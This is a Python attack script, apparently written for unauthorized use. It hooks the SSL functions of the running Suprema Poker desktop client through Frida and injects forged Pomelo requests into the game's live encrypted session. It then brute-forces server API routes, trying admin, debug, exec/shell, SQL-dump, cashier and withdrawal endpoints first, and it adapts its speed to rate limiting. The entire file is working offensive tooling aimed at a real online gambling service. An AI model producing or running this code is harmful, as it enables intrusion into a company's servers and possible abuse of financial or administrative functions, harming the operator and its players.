"""Suprema Poker - Pomelo Route Enumerator v2
Prioritized route discovery: tests high-value routes first (admin, debug, exec, data),
then common game routes. Fast batching with adaptive rate control.
"""
import frida, json, time, sys, os, subprocess, threading, random
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

try:
    import msgpack
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'msgpack'])
    import msgpack

# ── State ──
lock = threading.Lock()
recv_buf = b''
send_buf = b''
last_reqid = 0
results = {}        # reqId -> {'route': str, 'status': str, 'response': ...}
pending = {}        # reqId -> route
response_events = {}  # reqId -> Event
LOG = os.path.expanduser('~/suprema_route_enum.log')
RESULTS_JSON = os.path.expanduser('~/suprema_routes_found.json')

KNOWN_ROUTES = [
    "apiClub.clubHandler.info",
    "apiClubMatch.clubMatchHandler.match",
    "apiClubMatch.clubMatchHandler.matchGU",
    "apiPlayer.playerHandler.joinGameRoom",
    "room.roomHandler.clientMessage",
]

# ── Prioritized route generation ──
def generate_prioritized_routes():
    """Generate routes in priority order: most interesting first."""

    # Priority 1: Admin/Debug/Dangerous routes (small set, highest value)
    p1_modules = ["Admin", "System", "Debug", "Master", "Monitor", "Internal",
                  "Dev", "Test", "Server", "Config", "Database", "DB",
                  "Secret", "Private", "Rpc", "Service"]
    p1_actions = [
        "info", "list", "get", "getAll", "status", "config", "settings",
        "listAll", "listUsers", "listPlayers", "listClubs", "listRooms",
        "getAllUsers", "getAllPlayers", "getAllClubs", "getAllRooms",
        "getConfig", "getSettings", "setConfig", "updateConfig",
        "exec", "eval", "run", "execute", "cmd", "command", "shell", "console",
        "sql", "query", "raw", "dump", "export", "backup",
        "login", "auth", "authenticate", "authorize",
        "grant", "revoke", "promote", "demote",
        "shutdown", "reboot", "restart", "reset", "maintenance", "migrate",
        "create", "delete", "remove", "drop", "destroy",
        "debug", "test", "ping", "health", "version",
        "broadcast", "notify", "send",
        "ban", "unban", "kick", "mute", "block", "unblock",
        "transfer", "deposit", "withdraw", "balance",
    ]
    p1_short = ["admin", "system", "debug", "master", "monitor", "internal",
                "server", "config", "manager", "rpc", "service", "worker"]

    # Priority 2: Auth/Security/Permission routes
    p2_modules = ["Auth", "Security", "Permission", "Role", "Access",
                  "Privilege", "Token", "Session", "Password", "Pin",
                  "Account", "Login", "Register", "Ban", "Blacklist", "Whitelist"]
    p2_actions = p1_actions + ["login", "logout", "signup", "signin", "verify",
                               "validate", "confirm", "join", "connect"]

    # Priority 3: Data/Export routes
    p3_modules = ["Data", "Export", "Import", "Backup", "Report", "Audit",
                  "Log", "History", "HandHistory", "Stats", "Stat",
                  "Cache", "Redis", "Mongo", "Mysql", "Postgres",
                  "File", "Upload", "Download"]
    p3_actions = ["list", "get", "getAll", "export", "dump", "backup",
                  "query", "search", "find", "download", "read", "load",
                  "listAll", "info", "status", "raw"]

    # Priority 4: Game/Financial routes (might reveal interesting data)
    p4_modules = ["Cashier", "Bank", "Wallet", "Payment", "Pay",
                  "Deposit", "Withdraw", "Transfer", "Bonus", "Reward",
                  "Jackpot", "Rake", "Insurance", "VIP",
                  "Lobby", "Tournament", "Tourney", "SitNGo", "SNG",
                  "Union", "GrandUnion", "Federation", "League", "Alliance"]
    p4_actions = ["info", "list", "get", "getAll", "status", "balance",
                  "history", "config", "settings", "listAll",
                  "transfer", "deposit", "withdraw"]

    # Priority 5: Extended game routes (broader scan)
    p5_modules = ["Player", "Club", "ClubMatch", "Game", "Room", "Match",
                  "Table", "Gamer", "Spectator", "Observer", "User",
                  "Seat", "Dealer", "Blind", "Pot",
                  "Gate", "Connector", "Chat", "Manager", "Agent",
                  "Notification", "Notice", "Message", "Mail", "Inbox",
                  "Friend", "Social", "Invite", "Referral",
                  "Avatar", "Profile", "Level", "Rank", "Leaderboard",
                  "Support", "Ticket", "Help",
                  "Event", "Webhook", "Callback", "Push"]
    p5_actions = ["info", "list", "get", "getAll", "status",
                  "config", "settings", "listAll", "search", "find",
                  "join", "leave", "enter", "create", "update", "delete",
                  "send", "read", "history", "export"]

    # Direct single-word routes
    direct = ["status", "info", "health", "ping", "version", "config",
              "debug", "admin", "test", "exec", "eval", "shell",
              "dump", "export", "listAll", "getAll", "login", "auth",
              "monitor", "metrics", "stats", "trace", "log", "help",
              "whoami", "me", "self", "user", "player", "system",
              "server", "cluster", "node", "master", "worker",
              "env", "environment", "vars", "secrets"]

    seen = set(KNOWN_ROUTES)
    priorities = []

    def add_routes(modules, actions, short_mods=None, label=""):
        batch = []
        # api{Module}.{handler}.{action} pattern
        for mod in modules:
            handler = mod[0].lower() + mod[1:] + "Handler"
            for action in actions:
                r = f"api{mod}.{handler}.{action}"
                if r not in seen:
                    seen.add(r)
                    batch.append(r)
        # {mod}.{mod}Handler.{action} pattern
        if short_mods:
            for mod in short_mods:
                for action in actions:
                    r = f"{mod}.{mod}Handler.{action}"
                    if r not in seen:
                        seen.add(r)
                        batch.append(r)
        return batch

    # Build prioritized list
    p1 = add_routes(p1_modules, p1_actions, p1_short, "P1-CRITICAL")
    # Add direct routes
    for r in direct:
        if r not in seen:
            seen.add(r)
            p1.append(r)
    priorities.append(("P1-CRITICAL (admin/debug/exec)", p1))

    p2 = add_routes(p2_modules, p2_actions, ["auth"], "P2-AUTH")
    priorities.append(("P2-AUTH (security/permissions)", p2))

    p3 = add_routes(p3_modules, p3_actions, ["debug"], "P3-DATA")
    priorities.append(("P3-DATA (export/backup/logs)", p3))

    p4 = add_routes(p4_modules, p4_actions, label="P4-FINANCE")
    priorities.append(("P4-FINANCE (cashier/payments)", p4))

    p5 = add_routes(p5_modules, p5_actions,
                    ["room", "gate", "connector", "chat", "player", "club",
                     "game", "match", "table", "lobby", "agent"], "P5-GAME")
    priorities.append(("P5-GAME (extended game routes)", p5))

    return priorities

# ── WebSocket / Pomelo ──
def parse_ws(buf):
    frames = []; pos = 0
    while pos < len(buf):
        if pos + 1 >= len(buf): break
        b0 = buf[pos]; b1 = buf[pos+1]; op = b0 & 0xF
        if op not in (1,2,8,9,10) and (b0&0x80)==0: pos += 1; continue
        m = (b1&0x80) != 0; pl = b1 & 0x7F; hl = 2
        if pl == 126:
            if pos+3 >= len(buf): break
            pl = (buf[pos+2]<<8)|buf[pos+3]; hl = 4
        elif pl == 127:
            if pos+9 >= len(buf): break
            pl = int.from_bytes(buf[pos+2:pos+10],'big'); hl = 10
        if m: hl += 4
        t = pos + hl + pl
        if t > len(buf): break
        if m:
            mk = buf[pos+hl-4:pos+hl]; r = bytearray(buf[pos+hl:t])
            for i in range(len(r)): r[i] ^= mk[i%4]
            frames.append(bytes(r))
        else:
            frames.append(buf[pos+hl:t])
        pos = t
    return frames, buf[pos:]

def process(raw, d):
    global recv_buf, send_buf, last_reqid
    with lock:
        if d == 'RECV':
            recv_buf += raw
            frames, recv_buf = parse_ws(recv_buf)
        else:
            send_buf += raw
            frames, send_buf = parse_ws(send_buf)

    for frame in frames:
        if len(frame) < 4: continue
        ptype = frame[0]

        if d == 'SEND' and ptype == 4:
            plen = (frame[1]<<16)|(frame[2]<<8)|frame[3]
            pb = frame[4:4+plen]
            if len(pb) >= 3:
                rid = (pb[0]<<8)|pb[1]
                if rid > last_reqid:
                    last_reqid = rid

        elif d == 'RECV' and ptype == 2:
            req_id = (frame[1]<<16)|(frame[2]<<8)|frame[3]
            body = None
            if len(frame) > 4:
                try: body = msgpack.unpackb(frame[4:], raw=False)
                except: body = {'_hex': frame[4:60].hex()}
            route = pending.get(req_id)
            if route:
                classify(req_id, route, body)

        elif d == 'RECV' and ptype == 4:
            plen = (frame[1]<<16)|(frame[2]<<8)|frame[3]
            pb = frame[4:4+plen]
            if len(pb) < 2: continue
            flags = pb[0]
            body = None
            if flags & 0x04:
                if len(pb) > 3:
                    try: body = msgpack.unpackb(pb[3:], raw=False)
                    except: pass
            else:
                rl = pb[1]; off = 2+rl
                if off < len(pb):
                    try: body = msgpack.unpackb(pb[off:], raw=False)
                    except: pass

            if isinstance(body, dict) and body.get('event') == 'error':
                err_msg = body.get('errorMessage', str(body))
                for rid in list(pending.keys()):
                    if rid not in results:
                        results[rid] = {
                            'route': pending[rid],
                            'status': f'ERROR_PUSH:{str(err_msg)[:60]}',
                            'response': body,
                        }
                        evt = response_events.get(rid)
                        if evt: evt.set()
                        break

def classify(req_id, route, body):
    status = 'UNKNOWN'
    if body is None:
        status = 'EMPTY_RESPONSE'
    elif isinstance(body, dict):
        code = body.get('code', -1)
        event = body.get('event', '')
        err = str(body.get('errorMessage', body.get('error', body.get('msg', ''))))
        err_low = err.lower()
        data = body.get('data', body.get('result', body.get('apiData', None)))

        if event == 'error' or code not in (0, 200, -1):
            if any(x in err_low for x in ['route', 'not found', 'handler', 'no handler', 'unknown']):
                status = 'NOT_FOUND'
            elif any(x in err_low for x in ['auth', 'permission', 'denied', 'forbidden', 'access', 'privilege', 'role']):
                status = 'AUTH_DENIED'
            elif any(x in err_low for x in ['param', 'missing', 'invalid', 'required', 'argument']):
                status = 'PARAM_ERROR'
            elif any(x in err_low for x in ['login', 'session', 'token', 'expired']):
                status = 'SESSION_ERROR'
            elif any(x in err_low for x in ['rate', 'limit', 'throttle', 'slow', 'too many']):
                status = 'RATE_LIMITED'
            elif any(x in err_low for x in ['disabled', 'maintenance', 'unavailable']):
                status = 'DISABLED'
            else:
                status = f'ERROR:{err[:60]}'
        elif code == 0 or code == 200:
            if data is not None:
                status = 'SUCCESS_WITH_DATA'
            else:
                status = 'SUCCESS'
        elif data is not None:
            status = 'HAS_DATA'
        else:
            status = f'RESP:{list(body.keys())[:4]}'
    else:
        status = f'TYPE:{type(body).__name__}'

    results[req_id] = {'route': route, 'status': status, 'response': body}
    evt = response_events.get(req_id)
    if evt: evt.set()

    # Colorize output
    INTERESTING = {'SUCCESS', 'SUCCESS_WITH_DATA', 'HAS_DATA', 'AUTH_DENIED', 'PARAM_ERROR', 'DISABLED'}
    if any(status.startswith(s) for s in INTERESTING):
        color = '\033[92m'; mark = ' <<<< INTERESTING!'
    elif status == 'NOT_FOUND':
        color = '\033[90m'; mark = ''
    elif status == 'RATE_LIMITED':
        color = '\033[91m'; mark = ' !! RATE LIMITED'
    elif status.startswith('ERROR:'):
        color = '\033[93m'; mark = ''
    else:
        color = '\033[96m'; mark = ''

    preview = json.dumps(body, ensure_ascii=False, default=str)[:150] if body else 'null'
    line = f"  [{status}] {route} -> {preview}{mark}"
    print(f"{color}{line}\033[0m")
    sys.stdout.flush()

    with open(LOG, 'a', encoding='utf-8') as f:
        full_resp = json.dumps(body, ensure_ascii=False, default=str)[:1000] if body else 'null'
        f.write(f"[{status}] {route}\n  {full_resp}\n\n")

# ── Injection ──
def build_ws_frame(payload):
    frame = bytearray([0x82])
    plen = len(payload)
    if plen < 126:
        frame.append(0x80 | plen)
    elif plen < 65536:
        frame.append(0x80 | 126)
        frame.extend(plen.to_bytes(2, 'big'))
    else:
        frame.append(0x80 | 127)
        frame.extend(plen.to_bytes(8, 'big'))
    mask = bytes([random.randint(0,255) for _ in range(4)])
    frame.extend(mask)
    masked = bytearray(payload)
    for i in range(len(masked)):
        masked[i] ^= mask[i % 4]
    frame.extend(masked)
    return bytes(frame)

def build_pomelo_request(reqid, route, body_json):
    route_bytes = route.encode('utf-8')
    body_bytes = body_json.encode('utf-8')
    inner = bytes([(reqid >> 8) & 0xFF, reqid & 0xFF, len(route_bytes)]) + route_bytes + body_bytes
    plen = len(inner)
    return bytes([4, (plen >> 16) & 0xFF, (plen >> 8) & 0xFF, plen & 0xFF]) + inner

def inject(pomelo_bytes):
    ws = build_ws_frame(pomelo_bytes)
    return active_sc.exports_sync.inject(ws.hex())

def probe_route(route, reqid):
    """Send a single route probe."""
    body = json.dumps({
        "unionID": 128, "clubID": 41157, "myClubID": 41157, "myUnionID": 128,
        "ver": 7288, "lan": "pt", "verPackage": "5"
    })
    pomelo = build_pomelo_request(reqid, route, body)
    pending[reqid] = route
    evt = threading.Event()
    response_events[reqid] = evt
    inject(pomelo)
    return evt

# ── Frida ──
JS = r'''
try {
    var sslmod = Process.findModuleByName("libssl-1_1.dll");
    var ssl_read = sslmod.findExportByName("SSL_read");
    var ssl_write = sslmod.findExportByName("SSL_write");
    var ssl_write_fn = new NativeFunction(ssl_write, 'int', ['pointer', 'pointer', 'int']);
    var gameSSL = null; var sslConns = {};
    Interceptor.attach(ssl_read, {
        onEnter: function(a) { this.ssl = a[0]; this.buf = a[1]; },
        onLeave: function(r) {
            var n = r.toInt32();
            if (n > 0) {
                var p = this.ssl.toString(), b = this.buf.readU8();
                if (b===0x82||b===4) { gameSSL=this.ssl; sslConns[p]=true; }
                if (sslConns[p]) send({t:"d",d:"RECV"}, this.buf.readByteArray(n));
            }
        }
    });
    Interceptor.attach(ssl_write, {
        onEnter: function(a) {
            this.ssl=a[0]; var n=a[2].toInt32();
            if (n>0) {
                var p=this.ssl.toString(), b=a[1].readU8();
                if (b===0x82||b===4) { gameSSL=this.ssl; sslConns[p]=true; }
                if (sslConns[p]) send({t:"d",d:"SEND"}, a[1].readByteArray(n));
            }
        }
    });
    rpc.exports = {
        inject: function(h) {
            if (!gameSSL) return "NO_SSL";
            var d=[]; for(var i=0;i<h.length;i+=2) d.push(parseInt(h.substr(i,2),16));
            var b=Memory.alloc(d.length); b.writeByteArray(d);
            return "OK:"+ssl_write_fn(gameSSL,b,d.length);
        },
        hasssl: function() { return gameSSL?"YES":"NO"; }
    };
    send({t:"ready"});
} catch(e) { send({t:"fatal",e:e.toString()}); }
'''

# ── Main ──
print("\033[95m" + "=" * 60)
print("  SUPREMA POKER - ROUTE ENUMERATOR v2")
print("  Priority-based API discovery")
print("=" * 60 + "\033[0m")

r = subprocess.check_output(
    'tasklist /FI "IMAGENAME eq SupremaPoker.exe" /FO CSV /NH',
    shell=True, text=True
).strip()
pids = [int(l.split(',')[1].strip('"')) for l in r.splitlines() if 'SupremaPoker' in l]
print(f"\nPIDs: {pids}")
if not pids:
    print("SupremaPoker not running!"); sys.exit(1)

active_sc = None
sessions = []
for pid in pids:
    try:
        sess = frida.attach(pid)
        sc = sess.create_script(JS)
        def make_cb(p):
            def cb(msg, data):
                if msg['type']!='send': return
                pl = msg['payload']
                if pl.get('t')=='ready': print(f"  PID {p}: HOOK OK")
                elif pl.get('t')=='d' and data: process(bytes(data), pl.get('d','RECV'))
            return cb
        sc.on('message', make_cb(pid))
        sc.load()
        sessions.append((sess, sc, pid))
    except Exception as e:
        print(f"  PID {pid}: {e}")

print("\nDetecting gameSSL (6s)... Navigate in the app if needed.")
time.sleep(6)

for sess, sc, pid in sessions:
    try:
        if sc.exports_sync.hasssl() == "YES":
            active_sc = sc
            print(f"  PID {pid}: gameSSL FOUND!")
            break
    except: pass

if not active_sc:
    print("No gameSSL. Navigate in the app and retry."); sys.exit(1)

print(f"ReqId base: {last_reqid}")
if last_reqid == 0: last_reqid = 100

with open(LOG, 'w', encoding='utf-8') as f:
    f.write(f"=== Route Enumeration v2 - {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")

# ── Phase 0: Validate injection with known routes ──
print("\n\033[95m--- PHASE 0: Validating injection with known routes ---\033[0m")
enum_reqid = last_reqid + 200
validation_ok = 0

for route in KNOWN_ROUTES:
    enum_reqid += 1
    evt = probe_route(route, enum_reqid)
    if evt.wait(timeout=3):
        r = results.get(enum_reqid, {})
        if r.get('status', '').startswith(('SUCCESS', 'HAS_DATA', 'PARAM', 'ERROR', 'RESP')):
            validation_ok += 1
    time.sleep(0.2)

print(f"\n  Validation: {validation_ok}/{len(KNOWN_ROUTES)} known routes responded")
if validation_ok == 0:
    print("  \033[91mWARNING: No responses from known routes.\033[0m")
    print("  Responses may be arriving as type-4 pushes instead of type-2.")
    print("  Continuing with enumeration anyway...")
    time.sleep(1)

# ── Enumerate by priority ──
priorities = generate_prioritized_routes()
total_tested = 0
total_interesting = 0
all_interesting = []
rate_limited = 0
disconnected = False

BATCH = 10       # Routes per batch
WAIT = 0.8       # Wait after batch for responses
DELAY = 0.08     # Delay between routes in batch

try:
    for priority_label, routes in priorities:
        if disconnected:
            break

        print(f"\n\033[95m{'='*60}")
        print(f"  {priority_label} - {len(routes)} routes")
        print(f"{'='*60}\033[0m")

        batch_interesting = 0

        for i in range(0, len(routes), BATCH):
            batch = routes[i:i+BATCH]
            batch_num = i // BATCH + 1
            total_batches = (len(routes) + BATCH - 1) // BATCH

            sys.stdout.write(f"\r  Batch {batch_num}/{total_batches} | tested={total_tested} interesting={total_interesting} ")
            sys.stdout.flush()
            print()

            for route in batch:
                enum_reqid += 1
                probe_route(route, enum_reqid)
                time.sleep(DELAY)
                total_tested += 1

            # Wait for responses
            time.sleep(WAIT)

            # Check results from this batch
            for route in batch:
                for rid, r in results.items():
                    if r['route'] == route:
                        s = r['status']
                        if s not in ('NOT_FOUND', 'EMPTY_RESPONSE', 'UNKNOWN'):
                            if not any(x['route'] == route for x in all_interesting):
                                all_interesting.append(r)
                                total_interesting += 1
                                batch_interesting += 1
                        if s == 'RATE_LIMITED':
                            rate_limited += 1
                        break

            # Adaptive: if rate limited, slow down
            if rate_limited > 3:
                print(f"\n  \033[91m  Rate limiting detected! Slowing down...\033[0m")
                DELAY = 0.3
                WAIT = 2.0
                rate_limited = 0

            # Check SSL still alive every 5 batches
            if batch_num % 5 == 0:
                try:
                    if active_sc.exports_sync.hasssl() != "YES":
                        print(f"\n  \033[91m  gameSSL LOST! Stopping.\033[0m")
                        disconnected = True
                        break
                except:
                    print(f"\n  \033[91m  Frida connection lost!\033[0m")
                    disconnected = True
                    break

        if batch_interesting:
            print(f"\n  >> {priority_label}: {batch_interesting} interesting routes found!")

except KeyboardInterrupt:
    print("\n\nInterrupted.")

# ── Summary ──
print("\n" + "=" * 60)
print("  FINAL RESULTS")
print("=" * 60)

by_status = {}
for rid, r in results.items():
    s = r['status']
    base = s.split(':')[0] if ':' in s else s
    if base not in by_status: by_status[base] = []
    by_status[base].append(r)

not_found = len(by_status.get('NOT_FOUND', []))
print(f"\n  Total tested:    {total_tested}")
print(f"  Not found:       {not_found}")
print(f"  Interesting:     {total_interesting}")

for status, items in sorted(by_status.items()):
    if status in ('NOT_FOUND', 'EMPTY_RESPONSE', 'UNKNOWN'):
        continue
    print(f"\n  \033[92m[{status}] - {len(items)} routes:\033[0m")
    for r in items:
        resp = json.dumps(r['response'], ensure_ascii=False, default=str)[:200]
        print(f"    {r['route']}")
        print(f"      {resp}")

# Save
found = {
    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
    'total_tested': total_tested,
    'not_found': not_found,
    'known_routes': KNOWN_ROUTES,
    'interesting': [],
}
for r in all_interesting:
    found['interesting'].append({
        'route': r['route'],
        'status': r['status'],
        'response': r.get('response'),
    })

with open(RESULTS_JSON, 'w', encoding='utf-8') as f:
    json.dump(found, f, indent=2, ensure_ascii=False, default=str)

print(f"\n  Results: {RESULTS_JSON}")
print(f"  Log:     {LOG}")

for sess, sc, pid in sessions:
    try: sc.unload()
    except: pass
    try: sess.detach()
    except: pass
print("\nDone.")
